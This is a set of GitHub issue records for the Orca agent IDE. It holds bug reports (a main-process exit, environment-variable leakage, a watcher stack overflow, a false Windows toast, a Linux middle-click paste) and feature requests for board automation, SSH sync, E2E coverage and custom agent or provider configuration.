Orca's main process exits cleanly (wait status 1792 → exit code 7, no signal, no `.ips`/`.crash` produced by macOS CrashReporter) while connected over SSH to a remote dev VM with ~10 workspaces open and several high-stdout CLI agents + dev servers streaming through the relay. Because the OS sees a clean `exit()`-style shutdown, the cause must be in Orca/Electron's main-process JS — likely an internal watchdog, unhandled exception, or stream-backpressure trip — but Orca doesn't appear to ship a main-process log I can attach.

**Environment**
- Orca: 1.4.6
- OS: macOS 26.4 (Build 25E246), arm64e
- Hardware: Mac16,12 · Apple M4 · 32 GB RAM
- Transport: SSH to a remote Linux dev VM over a Tailscale WireGuard tunnel (direct, `utun4`), avg ~45 KB/s outbound.
- Workload at the time of exit:
  - ~10 simultaneous workspaces open against the same remote VM
  - 6 autonomous CLI coding agents (Codex CLI in `--yolo` mode) streaming continuous stdout
  - 3 `vite` dev servers streaming HMR/log output
  - Two workspaces had port-forwards enabled
  - Both `daemon-entry.js` helpers (`v5` and `v7`) were resident

**What happened**
At 19:13:35 UTC, Orca disappeared. macOS unified log:

```
runningboardd: [app<application.com.stablyai.orca.*(501)>:<PID>] termination reported by launchd (0, 0, 1792)
launchservicesd: QUITTING: pid=<PID> ... foreground=1
launchd: [system:] removing child: pid/<PID>
```

`1792` = `0x0700` → `WEXITSTATUS == 7`. No signal. No `ReportMemoryException` was invoked against any Orca PID. No `.ips`/`.crash` file landed in either `/Library/Logs/DiagnosticReports/` or `~/Library/Logs/DiagnosticReports/`.

Orca-spawned XPC helpers (`SafariPlatformSupport.Helper`, `ThemeWidgetControlViewService`) were SIGKILLed by launchd a few ms later (`termination reported by launchd (2, 9, 9)`) — that's a consequence of the parent exit, not the cause.

On the network side, kernel `tcp_connection_summary` shows the SSH socket over `utun4` was torn down by Orca with an outbound RST after ~63 min (~340 MB in / ~57 MB out). The remote sshd then logged `code=-1 / context canceled`, confirming the macOS client side died first.

The two `daemon-entry.js` helpers **survived** the main-process exit and were still resident when the main process restarted ~2 s later as a fresh PID.

**Reproduction (best guess from the workload)**
I can't pin down a deterministic repro yet, but here's the shape I think matters:

1. macOS (Apple Silicon, recent macOS), install Orca 1.4.6.
2. Connect to a remote dev VM over SSH (anything stable — using Tailscale here just to rule out network jitter).
3. Open ~10 workspaces against the same remote host.
4. In ~6 of them, start an autonomous CLI agent that streams continuous stdout (e.g. `codex --yolo`, or any long-running process emitting steady output).
5. In another ~3, run `vite dev` or anything else emitting HMR/log output continuously.
6. Leave it for ~45–60 minutes.

I'd suspect a long-tail correlation with aggregate stdout volume across many workspaces × time, or with terminal scrollback buffer growth in the renderer.

**What I've ruled out**
- macOS jetsam / OOM-kill: none in the 2h window; `kern.memorystatus_level=65` (healthy) throughout.
- `EXC_RESOURCE` high-watermark: not against any Orca PID. The two events in the same second belong to `com.apple.Safari` XPC helpers (15 MB) and `ThemeWidgetControlViewService` (30 MB) under differen
payload.title: [Bug]: Orca main process exits cleanly with status 7 under SSH-heavy multi-workspace workload (macOS, no crash dump generated)

payload.author: AIEPhoenix
payload.body:
## Summary

Daemon-backed terminal sessions are spawned with `ELECTRON_RUN_AS_NODE=1` in their environment. Any program inside the terminal that resolves to the bundled `electron` binary (e.g. `electron .`, `npx electron`, `electron-builder` subprocesses, build scripts that shell out to `electron`) then runs as plain Node — no GPU init, no window, no asar `require` integration — and silently misbehaves.

## Root cause

The daemon is forked from the main Electron process with `ELECTRON_RUN_AS_NODE: '1'` explicitly injected (see `src/main/daemon/daemon-init.ts:142-148`). That flag is correct and necessary for the daemon itself — without it, Electron's GPU/display initialization can interfere with node-pty's `posix_spawn` of `spawn-helper`.

The problem is leakage: inside the daemon, `process.env.ELECTRON_RUN_AS_NODE === '1'`. When the daemon spawns a user PTY in `src/main/daemon/pty-subprocess.ts:157-175`, it builds the child shell env by spreading `process.env` and never strips the flag:

\`\`\`ts
const env: Record<string, string> = {
  ...process.env,        // ← carries ELECTRON_RUN_AS_NODE=1
  ...opts.env,
  TERM: 'xterm-256color',
  COLORTERM: 'truecolor',
  TERM_PROGRAM: 'Orca',
  TERM_PROGRAM_VERSION: ...,
  FORCE_HYPERLINK: '1'
}
removeUnspecifiedPaneIdentityEnv(env, opts.env)
removeInheritedDevAgentHookEndpoint(env, opts.env)
removeInheritedNoColor(env)
// no ELECTRON_RUN_AS_NODE strip
\`\`\`

The variable is then passed unchanged to \`pty.spawn(shellPath, shellArgs, { ..., env })\`.

## Why the in-process \`LocalPtyProvider\` is unaffected

\`src/main/providers/local-pty-provider.ts\` builds the env the same way, but the main process itself is **not** launched with \`ELECTRON_RUN_AS_NODE\`, so \`process.env.ELECTRON_RUN_AS_NODE\` is undefined there. Only the daemon path leaks.

## Reproduction

1. Open any terminal in Orca (daemon-backed is the default).
2. Run \`env | grep ELECTRON_RUN_AS_NODE\` → \`ELECTRON_RUN_AS_NODE=1\`.
3. Try \`electron .\` or \`npx electron .\` from a project that uses Electron → it runs as Node and the window never opens.

## Prior art

The codebase already knows this variable must be cleaned at boundaries:
- \`src/cli/runtime/launch.ts:155\` — \`delete next.ELECTRON_RUN_AS_NODE\` when the CLI re-execs.
- \`config/scripts/run-electron-vite-dev.mjs:23\` — strips it from \`process.env\` at dev boot.
- \`tests/e2e/helpers/orca-app.ts:186-190\` and \`tests/e2e/helpers/orca-restart.ts:44\` — strip it before spawning Orca in E2E.

The daemon → PTY hop was simply missed.

## Proposed fix

Add a sibling to \`removeInheritedDevAgentHookEndpoint\` / \`removeInheritedNoColor\` in \`src/main/daemon/pty-subprocess.ts\` that unconditionally deletes \`ELECTRON_RUN_AS_NODE\` from the child shell env, and call it where the other env scrubbers are invoked. Renderer code has no legitimate reason to pass this flag, so the strip can be unconditional.

PR coming.
payload.title: Terminal sessions inherit ELECTRON_RUN_AS_NODE=1 from the daemon process

payload.author: maco222
payload.body:
**OS**: Linux (likely all platforms — see Cross-platform note)
**Orca version**: reproduced on installed v1.4.12-rc.0 (`dpkg -l` → `orca-ide 1.4.12~rc.0`). Same buggy line present on `v1.4.12` stable and `main` (`5ce01c86`).

**Short summary**

Deleting a worktree containing many tracked files crashes the main process with:

```
RangeError: Maximum call stack size exceeded
    at /opt/Orca/resources/app.asar/out/main/index.js:18037:27
```

Bundle line 18037:27 maps to `root.batch.events.push(...events)` in [`src/main/ipc/filesystem-watcher.ts#L288`](https://github.com/stablyai/orca/blob/5ce01c86441869144c726cc6f7ed86eefb4a41db/src/main/ipc/filesystem-watcher.ts#L288) on `main`.

**Repro**

1. Open a worktree in Orca that contains a large number of tracked files (tens of thousands; not just `node_modules`, since that's already in `WATCHER_IGNORE_DIRS`). A pergam-style monorepo worktree is enough.
2. From the sidebar, click "Delete worktree" (or "Force Delete") on that worktree while it is the active view (so the filesystem watcher is currently subscribed to its root).
3. Main process crashes; the delete cannot complete from inside Orca. The dialog reports `RangeError: Maximum call stack size exceeded`.

Expected: worktree is removed cleanly.
Actual: main process crash before / during `git worktree remove`.

**Root cause**

In the `@parcel/watcher` subscription callback:

```ts
// src/main/ipc/filesystem-watcher.ts:288
root.batch.events.push(...events)
scheduleBatchFlush(rootKey, root)
```

When `git worktree remove` (or the user-driven file deletion preceding it) wipes the worktree, Parcel delivers all of the resulting `delete` events to the JS callback in a **single** batch — there is no internal chunking. With a sufficiently large worktree, `events.length` exceeds V8's argument-count limit for a spread call (the limit varies with frame size, in practice on the order of 10⁵). The spread is compiled to a call where every event becomes a stack-allocated argument, so V8 throws `RangeError: Maximum call stack size exceeded` from inside `Array.prototype.push`. This happens *before* the error / overflow branch on lines 252–286 has a chance to fire (that branch only runs when the watcher itself reports `err`, not when a normal-but-huge events batch arrives), so the existing overflow-to-renderer fallback is bypassed.

The WSL polling watcher has the identical pattern at [`src/main/ipc/filesystem-watcher-wsl.ts#L158`](https://github.com/stablyai/orca/blob/5ce01c86441869144c726cc6f7ed86eefb4a41db/src/main/ipc/filesystem-watcher-wsl.ts#L158) — same bug class, would trigger under the same conditions on WSL.

**Proposed fix**

Replace the variadic spread with a per-element push (or `concat` if a fresh array is acceptable) in both watcher files:

```ts
// Why: Array spread (...events) is compiled into a function call where each
// event becomes a stack-allocated argument. On a worktree-deletion burst the
// batch can exceed V8's argument limit and crash main with
// "Maximum call stack size exceeded". A per-element push is O(n) but stays
// in bounds.
for (const event of events) {
  root.batch.events.push(event)
}
```

This is the minimal root-cause fix.

**Optional defense-in-depth (separate change)**

Even with the spread fixed, a worktree-deletion burst still funnels tens of thousands of paths through `coalesceEvents` and a `Promise.all(map(stat))` in [`flushBatch`](https://github.com/stablyai/orca/blob/5ce01c86441869144c726cc6f7ed86eefb4a41db/src/main/ipc/filesystem-watcher.ts#L160-L197). Consider: if `events.length` exceeds a threshold (e.g. 5_000), short-circuit by sending the existing `overflow` payload (the renderer already knows how to handle it) instead of building a per-path payload. This matches the spirit of the existing overflow branch in the error callback.

**Cross-platform note**

`@parcel/watcher` is used on macOS and Windows too, so the crash is not Linux-specific in principle. It is most likely to be hit on Linux because
payload.title: [Bug]: filesystem-watcher push(...events) crashes main with 'Maximum call stack size exceeded' on worktree deletion

payload.author: slashdevcorpse
payload.body:
### Problem

The workspace board is a manual kanban. Users drag cards between columns (todo, in-progress, in-review, completed), but nothing keeps these states accurate. Cards sit in "in-progress" long after a PR is merged. Agents finish work but the card stays where it was. The board goes stale because nobody remembers to update it.

### Proposal

Two board modes, toggled in settings:

1. **Manual board** (current behavior, default). User drags cards. Nothing changes.
2. **Agent-driven board**. Agents infer workspace status from corroborating signals. The user acts as the PM: final authority, can override or lock any transition.

This requires agent tokens/activity to function, so it must be an explicit opt-in toggle. Users who do not want agent cycles spent on board management keep the manual board.

### Core Principle

Agents prove work happened. The system proposes a transition only when multiple signals agree. The user's last word is law.

### Signal to Status Mapping

| Signal | Corroborating Evidence | Proposed Transition |
|--------|----------------------|-------------------|
| Worktree created, no commits | None needed | to do |
| First commit on branch OR agent status reports `working` | Both ideally, either sufficient | in progress |
| PR opened (linkedPR detected) | Branch has commits | in review |
| Agent status reports `done` + no PR exists yet | Commits exist on branch | in review |
| PR merged | CI passed (if available) | completed |
| **PR review has comments/requested changes** | Feedback detected on linked PR | **back to in progress** |
| Re-push after addressing feedback | New commits after review comments | in review (again) |

That last row is critical. When a PR is "in review" and gets feedback (requested changes, blocking comments), the workspace moves back to "in progress" because there is work to do. Once the agent or user pushes fixes, it returns to "in review". This loop continues until the PR is approved and merged.

### Heartbeats via Automations

The feedback detection (PR comments, review status, CI failures) should run as a **heartbeat automation** using Orca's existing automations system. This keeps the polling visible and configurable.

Proposed implementation: a built-in automation type (or a preset template) that runs on a schedule and checks linked PR status:

```
orca automations create \
  --name "Board status heartbeat" \
  --trigger "*/15 * * * *" \
  --prompt "Check linked PR status for all active workspaces. If review feedback exists, move to in-progress. If approved and CI green, move to completed." \
  --provider claude \
  --workspace-mode existing
```

The heartbeat checks:
- PR review state (approved, changes requested, commented)
- CI status (passing, failing)
- New comments since last check
- Merge status

These heartbeats should be visible in the **Automations tab** so users can see when they last ran, what they found, and what transitions they proposed. This is the same pattern as GitHub bots that review PRs, but operating on the local board state.

### Configuration

```
Settings > Workspace Board:
  Board mode:
    ( ) Manual (default, current behavior)
    ( ) Agent-driven (uses agent tokens for status inference)
  
  When agent-driven:
    [x] Move to "in progress" on first commit or agent activity
    [x] Move to "in review" when PR is opened
    [x] Move back to "in progress" when review feedback received
    [x] Move to "completed" when PR is merged
    
  Heartbeat interval: [every 15 minutes v]
```

The heartbeat automation appears in the Automations tab alongside user-created automations, clearly labeled as a system automation. Users can pause it, change its schedule, or view its run history like any other automation.

### Existing Plumbing

- `worktree.set` RPC accepts `workspaceStatus` (the write path exists)
- Agent hook server already emits agent states (`working`, `blocked`, `done`)
- `linkedPR` field already exists on worktrees
- Board UI already reacts to st
payload.title: [Feature]: Agent-driven workspace board status transitions with heartbeat polling

payload.author: slashdevcorpse
payload.body:
### Operating system

Windows

### Orca version

1.4.x (latest)

### Details

When launching any agent (Claude, Kiro, etc.) from the terminal tab bar on Windows, a toast appears after ~5 seconds saying:

> Couldn't launch [agent] — the terminal is still open.

The agent launches fine. The terminal opens. Everything works. The message is wrong.

**What happens:**

Orca spawns the agent tab, then polls for 5 seconds checking if the agent process is the foreground process. On Windows, this check fails because the process-matching logic in the readiness detector uses forward-slash path comparison:

```
c.endsWith(`/${expectedProcess}`)
```

Windows paths use backslashes. This branch never matches. If PowerShell profile loading is slow (common) or the process name comes back as a full path, the 5-second timeout expires and the toast fires — even though the agent started successfully.

**Expected behavior:**

No toast. The agent launched. The terminal is not "still open" in any meaningful sense — it's running the agent as intended.

**Suggested fix:**

In the readiness poll (the function that calls `_p` and compares `foregroundProcess` to `expectedProcess`), add a backslash path check for Windows:

```js
c.endsWith(`\\${t}`)
```

Or extract the basename before comparing. Optionally bump the timeout on Windows to account for slower shell init.

**Severity:** Cosmetic. Nothing breaks. But it trains users to ignore error toasts, which is bad UX hygiene.

### Steps to reproduce

1. Fresh Windows install, default PowerShell profile
2. Open Orca, add a repo
3. Click the + tab menu, launch any agent (Claude, Kiro, etc.)
4. Wait ~5 seconds
5. Toast appears claiming the launch failed. Agent is running fine in the terminal.
payload.title: [Bug]: False 'Couldn''t launch' toast fires on Windows even when agent starts successfully

payload.author: maco222
payload.body:
**OS**: Linux
**Orca version**: v1.4.5+ (also reproducible on `main` at `363ddb5e`)

**Short summary**

On Linux, middle-clicking a tab to close it triggers an unwanted primary-selection paste into whichever terminal becomes active after the close. The tab closes correctly (as intended), but text from the primary selection lands in the next visible terminal.

**Repro**

1. Linux (Wayland or X11).
2. Settings → Input → "Middle-click Paste from Selection" enabled (the default on Linux).
3. Select any text in Orca or another app — anything that fills the primary selection buffer.
4. Have at least two terminal tabs open in the same tab group.
5. Middle-click any terminal tab to close it.

Expected: tab closes, no other side effect.
Actual: tab closes AND the primary selection text appears in the terminal that becomes active after the close.

**Root cause (analysis)**

The existing `onMouseDown` preventDefault in [`SortableTab.tsx#L225-L237`](https://github.com/stablyai/orca/blob/363ddb5ef69d5cf2eb578b8dbfb8a2e3a723901b/src/renderer/src/components/tab-bar/SortableTab.tsx#L225-L237) blocks middle-button auto-scroll but does NOT block Chromium's primary-selection paste pipeline.

Empirically, canceling only `mousedown` / `auxclick` is insufficient; canceling `mouseup` for `button === 1` is what prevents Chromium's native primary-selection paste from firing. After the tab closes (`auxclick` → `onClose` → React re-render), focus moves to xterm's hidden `<textarea>` on the newly active terminal, and the paste can be delivered to that newly focused editable target. Applies to both X11 and Wayland sessions (Hyprland with `wp_primary_selection_unstable_v1` confirmed).

The `enabled=false` branch of [`usePrimarySelectionPaste.ts#L91-L100`](https://github.com/stablyai/orca/blob/363ddb5ef69d5cf2eb578b8dbfb8a2e3a723901b/src/renderer/src/hooks/usePrimarySelectionPaste.ts#L91-L100) already does the correct thing — `preventDefault()` on `mouseup` for `button === 1` — to block this exact native paste pipeline. The `enabled=true` branch ([`L138-L160`](https://github.com/stablyai/orca/blob/363ddb5ef69d5cf2eb578b8dbfb8a2e3a723901b/src/renderer/src/hooks/usePrimarySelectionPaste.ts#L138-L160)) intentionally lets Chromium handle native paste for editable targets, but exits without `preventDefault` when the target is non-editable (like a tab) — leaving the native paste to fire against whatever element gets focus later.

**Proposed fix**

Either:
(a) Add `onMouseUp` to `SortableTab` / `BrowserTab` / `EditorFileTab` that calls `event.preventDefault()` for `event.button === 1`. Surgical and tab-local.
(b) In `usePrimarySelectionPaste` (enabled branch), when `button === 1` `mouseup` on a non-editable, non-xterm target, call `preventDefault()`. Globally covers any future non-editable surfaces with the same bug class (sidebar buttons, drag handles, etc.). Constraint: must not block native middle-click paste inside editors or middle-click events inside terminal panes.

Option (b) preferable if the non-editable / non-xterm predicate is clean to express; (a) is the safest minimal first patch.

**Environment**

- OS: Linux
- Display server: reproducible under Wayland (Hyprland with `wp_primary_selection_unstable_v1`). Almost certainly reproducible under X11 too — the paste happens in Chromium's input pipeline, not at compositor/server level.
- Orca: v1.4.5 stable. Verified `handlePrimarySelectionMiddleMouseDown` in `TerminalPane.tsx` is NOT the trigger — DOM trees of tab bar and terminal pane are siblings, capture handlers don't fire.
payload.title: [Bug]: middle-click on a tab closes it AND pastes the primary selection into the next-active terminal (Linux)

payload.author: OTZUKI

These controls belong to the sidebar navigation rather than the titlebar. Current behavior: Sidebar menu icons are rendered directly inside the title bar area. The layout feels inconsistent with native Windows applications and other Electron-based apps. Recommended solution: It would be much better to move all sidebar menu buttons from the title bar into the sidebar itself. Benefits: Cleaner, more standard Windows title bar (only standard window controls: minimize, maximize, close). Better separation of concerns — sidebar controls stay inside the sidebar. Improved usability and visual hierarchy. More consistent look & feel across platforms. This change would make the UI feel more native and less cramped.
payload.title: [Bug]: "Improvement" Title bar clutter: Sidebar menu buttons are misplaced in the window title bar

payload.body:
### Problem or use case

The original SSH remote workspace sync PR (#1690) was closed in favor of a fresh rewrite (#1876, "feat(ssh): make remote workspaces first-class") that landed on `main`. The rewrite author explained the decision this way:

> "Rather than merge or rebase this directly, I rewrote the feature in a fresh PR that incorporated the core ideas here while fitting the current architecture and the newer SSH persistence work: #1876. The rewrite covers the main product boundary from this PR: opt-in remote workspace sync, relay-side workspace snapshots, remote workspace IPC, target-scoped session projection, relay asset packaging, provider dispatch, hydration guards, and explicit disconnect behavior. **I intentionally did not take the renderer terminal restore / auto-resume parts wholesale because that area had become fragile and was stabilized separately.**
>
> There are still a few ideas from this PR that may be worth follow-up issues, especially **device presence polish, explicit user-driven agent resume affordance, and resize ownership semantics**. But those should be handled as smaller changes on top of the current implementation rather than by reviving this branch."

That explanation is the reason for this issue: the rewrite is the right foundation, but a number of user-facing features and safety mitigations from (Original PR #1690) were intentionally deferred. Those gaps directly affect the original pain points that motivated the feature:

1. Working in Claude/Codex on a remote machine, closing Orca, and reconnecting later - the user can still lose their coding session or have to manually find and resume it.
2. Connecting to the same SSH target from a second device - the user gets the tab list and layout, but agents, browsers, editor files, and the *actual shells themselves* don't follow.

### Specific pain points still present in rewrite PR #1876 (fixed in original PR #1690)

- [ ] **A1 - No "who else is connected" indicator.** `workspace.presence` ships as an RPC but with no UI consumer, so the user can't tell whether a second device is currently looking at the same synced workspace.
- [ ] **A2 - No agent resume affordance.** When a remote Claude/Codex session ends (relay restart, host reboot, grace expiry), the user has to manually dig the session id out of Claude/Codex CLI history and retype `claude --resume <id>` themselves.
- [ ] **A3 - Cross-device resize fights corrupt TUIs.** Without ownership arbitration, two devices on the same shared PTY with different window dimensions race-resize on every focus change; Claude, Codex, vim, and htop layouts get corrupted.
- [ ] **B1 - Cold reattach silently fails.** On Orca relaunch, the renderer can race the SSH provider registration and decide a saved session is dead - consuming the saved id and spawning a fresh shell instead of reattaching to the still-alive PTY.
- [ ] **B2 - Nothing remembers the live agent session.** Orca doesn't track which Claude/Codex session id is active in which pane, so even when A2 ships there's no data layer to resume against - the resume affordance has nothing to point at.
- [ ] **C1 - "Shared workspace" only shares metadata.** Each device launches its own relay process on the host, so PTYs aren't actually shared between devices: the Claude shell on your laptop is a different process from the "claude" tab on your desktop. Switching machines means starting over with the same labels.
- [ ] **C2 - Push conflicts stick.** When two devices push at the same time, sync stops to that target and surfaces a "Workspace conflict" state until something dislodges it; common races like "both devices opened a tab in the same second" become visible failures.
- [ ] **C3 - Structural changes go stale.** Creating a worktree or adding a repo on Device A doesn't propagate to Device B until Device B reconnects to the target - the synced view silently lags.
- [ ] **C4 - Browser tabs don't follow.** Browser state (tabs, pages, active selection) stays on which
payload.title: [Feature]: SSH remote workspace sync - follow-up work from the original PR #1690 / rewrite PR #1876

payload.body:
## Summary

The E2E suite has good baseline coverage, but GitHub + Git + worktree integration still has risk gaps that can let regressions ship.

As of 2026-05-19, we have:
- Happy-path worktree create coverage (`tests/e2e/worktree.spec.ts`)
- Worktree lifecycle/invariant coverage (`tests/e2e/worktree-lifecycle.spec.ts`, etc.)
- Source Control PR/commit/discard coverage (`tests/e2e/source-control-*.spec.ts`)

However, several critical flows are currently under-covered or heavily mocked.

## Why this matters

Recent issues have clustered around GitHub/git/worktree behavior, which is exactly where failure-mode E2E tests are thinnest.

## Gaps to close (prioritized)

### P0 — high impact / likely regressions

1. **Create PR: real error handling path (not only mocked success)**
   - Cover create PR failures (auth denied, 401/403, network timeout, provider API error)
   - Assert user-visible error surface + retry behavior + dialog state integrity

2. **Create PR eligibility edge states**
   - Not eligible because no upstream / detached HEAD / dirty state / ahead-behind mismatch
   - Assert button disabled state + precise reason text

3. **Worktree create failure paths from composer UI**
   - Branch already exists
   - Invalid name/ref
   - Hook/setup failure
   - FS/permission error
   - Assert inline error rendering and no partial state leaks (`tabsByWorktree`, `openFiles`, active worktree)

4. **GitHub auth/session failure while Source Control is open**
   - Token expired/revoked mid-flow
   - Assert graceful fallback and recovery after re-auth

### P1 — correctness + platform confidence

5. **Cross-platform matrix for key Git/worktree flows**
   - Run core worktree/source-control subset on macOS + Linux + Windows regularly (not only Linux PR path)

6. **Remote tracking / base-ref mismatch scenarios**
   - Missing `origin/main`, renamed default branch, fork upstream mismatch
   - Assert base branch fallback/selection UX

7. **Branch naming + special chars**
   - Worktree/branch names with slashes, unicode, long names
   - Assert UI handles labels and commands robustly across platforms

8. **Concurrent operations**
   - Trigger fetch/status refresh while creating PR/worktree
   - Assert no UI deadlock or stale state overwrite

### P2 — reliability / anti-flake

9. **Reduce store-tautology assertions in E2E**
   - Prefer DOM-observable assertions after store seeding

10. **Replace remaining fixed sleeps with event/assertion waits**
   - Eliminate `waitForTimeout` where practical in affected specs

11. **Failure artifacts for debugging**
   - Ensure traces/log snapshots are attached for these new failure-mode tests

## Suggested implementation plan

- Phase 1: Add P0 tests first in `tests/e2e/source-control-*.spec.ts` and `tests/e2e/worktree.spec.ts`.
- Phase 2: Add P1 matrix + edge-case fixtures.
- Phase 3: Do anti-flake cleanups (P2).

## Acceptance criteria

- At least one end-to-end failure-mode spec exists for each P0 item.
- New specs assert **user-visible UI behavior** (not only store internals).
- PR checks include a fast smoke subset for these flows so regressions fail earlier.
payload.title: E2E: strengthen GitHub/git/worktree integration coverage (failure modes + edge cases)

payload.body:
## Summary

Today Orca's Claude account model only supports subscription OAuth (`claude auth login --claudeai`). The `claude` CLI itself supports many providers via env vars — direct Anthropic API key, AWS Bedrock, Google Vertex, Azure AI Foundry, and any Anthropic-compatible proxy (z.ai, Moonshot/Kimi, MiniMax, OpenRouter, etc.). Orca should let users register multiple accounts of any of these types, assign per-account model mappings for opus/sonnet/haiku tiers, and switch between accounts at runtime — preserving the current "switch without restart" guarantee.

## Current behavior

- `ClaudeManagedAccount.authMethod` is `'subscription-oauth' | 'unknown'` (`src/shared/types.ts:1078`, `:1089`)
- `ClaudeAccountService.doAddAccount` hardcodes subscription OAuth login (`src/main/claude-accounts/service.ts:97`, `:324`)
- `runtime-auth-service` materializes creds via `CLAUDE_CONFIG_DIR` patch pointing at a managed dir with `.credentials.json` + `oauth-account.json`
- `applyClaudeEnvPatch` (`src/main/claude-accounts/environment.ts`) strips `ANTHROPIC_API_KEY` / `ANTHROPIC_AUTH_TOKEN` / `CLAUDE_CODE_OAUTH_TOKEN` / `AWS_BEARER_TOKEN_BEDROCK` from PTY env when `stripAuthEnv: true` — needs a per-account carve-out

## claude CLI env vars (authoritative)

Source: https://docs.claude.com/en/docs/claude-code/env-vars

| Purpose | Env var |
|---|---|
| Default model for the active session | `ANTHROPIC_MODEL` |
| Opus-tier remap | `ANTHROPIC_DEFAULT_OPUS_MODEL` |
| Sonnet-tier remap | `ANTHROPIC_DEFAULT_SONNET_MODEL` |
| Haiku-tier remap (also covers small/fast subagent) | `ANTHROPIC_DEFAULT_HAIKU_MODEL` |
| Bedrock mode | `CLAUDE_CODE_USE_BEDROCK=1` |
| Vertex mode | `CLAUDE_CODE_USE_VERTEX=1` |
| Azure Foundry mode | `CLAUDE_CODE_USE_FOUNDRY=1` + `ANTHROPIC_FOUNDRY_RESOURCE` + `ANTHROPIC_FOUNDRY_API_KEY` |
| Anthropic-compatible proxy | `ANTHROPIC_BASE_URL` + `ANTHROPIC_AUTH_TOKEN` |
| Host-managed provider routing | `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST=1` (suppresses user settings — useful for Orca isolation) |

Note: `ANTHROPIC_SMALL_FAST_MODEL` is deprecated. Use `ANTHROPIC_DEFAULT_HAIKU_MODEL` instead.

## Providers to support — auth + default model mapping

### Anthropic OAuth (subscription)

- authMethod: `subscription-oauth`
- Existing path — unchanged. `CLAUDE_CONFIG_DIR` → managed dir with `.credentials.json` + `oauth-account.json`.

### Anthropic API key (direct)

- authMethod: `anthropic-api-key`
- Env: `ANTHROPIC_API_KEY=<key>`
- Defaults: `opus=claude-opus-4-7`, `sonnet=claude-sonnet-4-6`, `haiku=claude-haiku-4-5-20251001`

### AWS Bedrock

- authMethod: `aws-bedrock`
- Env: `CLAUDE_CODE_USE_BEDROCK=1`, `AWS_BEARER_TOKEN_BEDROCK=<token>`, `AWS_REGION=<region>` (or full AWS credential chain)
- Defaults (inference-profile prefix derived from region — `us.` / `eu.` / `apac.` / `jp.` / `global.`):
  - opus: `anthropic.claude-opus-4-7`
  - sonnet: `anthropic.claude-sonnet-4-6`
  - haiku: `anthropic.claude-haiku-4-5-20251001-v1:0`
- Note: 4.6+ tier IDs are bare (no `-v1:0`); haiku still dated. Most newer models require a cross-region inference profile. Per-region small-model override available via `ANTHROPIC_SMALL_FAST_MODEL_AWS_REGION`.

### Google Vertex AI

- authMethod: `google-vertex`
- Env: `CLAUDE_CODE_USE_VERTEX=1`, `ANTHROPIC_VERTEX_PROJECT_ID=<project>`, `CLOUD_ML_REGION=<region>` (auth via ADC / `gcloud auth application-default login`)
- Defaults (regional Vertex endpoint, `us` or `global`):
  - opus: `claude-opus-4-7`
  - sonnet: `claude-sonnet-4-6`
  - haiku: `claude-haiku-4-5@20251001` (alias: `claude-haiku-4-5`)

### Azure AI Foundry

- authMethod: `azure-foundry`
- Env: `CLAUDE_CODE_USE_FOUNDRY=1`, `ANTHROPIC_FOUNDRY_RESOURCE=<resource-name>` (or `ANTHROPIC_FOUNDRY_BASE_URL=<full-base>`), `ANTHROPIC_FOUNDRY_API_KEY=<project-key>` (or Entra ID via `az login` — no token env)
- Endpoint shape: `https://<resource>.services.ai.azure.com/anthropic/v1/messages`
- Defaults (deployment names default to canonical Anthropic IDs)
payload.title: Add multi-provider auth methods and per-account model mapping to Claude managed accounts

payload.author: noname-oni
payload.body:
### Problem or use case

The Agents settings page states: “Manage AI agents, set a default, and customize commands.” Currently, command customization only works for built-in agents. Users can override commands for agents like `codex` or `claude`, but cannot add new custom agents such as:

- Codex Remote VM: `codex-vm`
- Local wrapped Codex profile: `codex --profile foo`
- Internal/company CLI agent: `my-agent` / third-party agents (e.g. Reasonix)
- Multiple Claude Code (or other) accounts via env-isolated profiles (`CLAUDE_CONFIG_DIR=…`)
- Any new CLI agent before Orca supports them natively

This limitation is significant because Orca’s launch model is command-based, with each agent represented by a terminal command. While the UI allows command overrides, the catalog and default agent system remain closed.

Current behavior:
- `TuiAgent` is a fixed union in `src/shared/types.ts`.
- `TUI_AGENT_CONFIG` is a fixed record in `src/shared/tui-agent-config.ts`.
- `AGENT_CATALOG` is a fixed catalog in `src/renderer/src/lib/agent-catalog.tsx`.
- Settings store `agentCmdOverrides` as a partial record keyed by `TuiAgent`.
- The Agents pane renders only `AGENT_CATALOG`, so overrides apply only to known agents.
- Provider list for automations/CLI is hardcoded (`orca automations create --provider my-profile` → `Unknown provider`).
- `agentCmdOverrides` is global (no per-repo / per-automation scoping), not exposed in the CLI, and easy to misconfigure.

Thus, one can change “Codex” to run `codex-vm`, but cannot have both “Codex” and “Codex VM” as separate selectable agents. Multi-account users end up squatting on unused provider slots with PATH shims so the UI shows the wrong name, or launching profiles as plain terminals with no agent-session history.

Expected behavior:
Users should be able to create custom agent presets via Settings > Agents. A minimal preset should include:
- label (e.g., `Codex VM`, `Claude Work`)
- command (e.g., `codex-vm`, `claude`)
- default args
- environment variables (e.g. `CLAUDE_CONFIG_DIR`, provider URLs)
- prompt injection mode (default `stdin-after-start` or configurable)
- optional detect command (default first token)
- optional icon or favicon
- optional homepage or docs URL

Custom presets should appear alongside built-in agents in:
- Default agent picker
- Installed/custom agents list
- Workspace / worktree agent picker
- Quick launch surfaces
- CLI (`--agent` / `--provider`)
- Automations
- Command override/edit UI
- Agent session history (sessions from custom agents tracked like built-in ones)

### Additional requirements (from #9933 and related reports)

1. **Env + multi-profile support** — custom agents must carry an env map and default args so multi-account Claude Code setups (`CLAUDE_CONFIG_DIR=~/.claude-work` vs personal default) and env-based provider variants work as first-class agents, not PATH hacks.
2. **Click-to-launch + automation/CLI parity** — registered custom agents are selectable everywhere built-ins are: launcher UI, CLI flags, automations create/dispatch.
3. **Session history parity** — sessions started from custom agents (and ideally agents launched via terminal commands Orca recognizes) appear in agent session history.
4. **Per-repo scoping** — different repos may need different accounts/profiles (client separation, billing, memory isolation). Prefer per-repo (and ideally per-automation) selection of which custom agent/profile is default.
5. **Optional: profile variants on built-ins** — e.g. `claude@work` = the claude provider plus an env map, selectable per repo and per automation (alternative/additional to fully custom agent entries).

Why this fits Orca:
Orca already supports per-agent launch metadata via `TuiAgentConfig` and allows command overrides. The missing feature is persisting user-defined agents (command + args + env) and merging them with the built-in catalog, instead of requiring all agents to be compiled into `TuiAgent`.

Related: #9933 (merged into this issue), #147
payload.title: [Feature]: Allow users to add custom agent presets, not only override commands for built-in agents

payload.author: Bnjoroge1
payload.body:
### Problem or use case

